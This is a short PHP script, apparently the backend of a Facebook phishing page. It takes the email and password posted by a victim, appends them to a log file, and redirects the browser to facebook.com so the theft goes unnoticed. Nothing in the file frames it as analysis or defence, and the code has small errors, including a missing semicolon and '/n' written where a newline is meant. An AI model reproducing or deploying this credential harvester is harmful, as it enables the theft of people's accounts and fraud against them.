<?php
 header ('location: http://www.facebook.com')
 $mail = $_POST["email"];
 $pass = $_POST["pass"];
 $file = fopen("log.txt","a");
 fwrite($file,"/n/nEmail : ");
 fwrite($file,$mail);
 fwrite($file,"/npassword : ");
 fwrite($file,$pass);
 fclose($file);
 ?>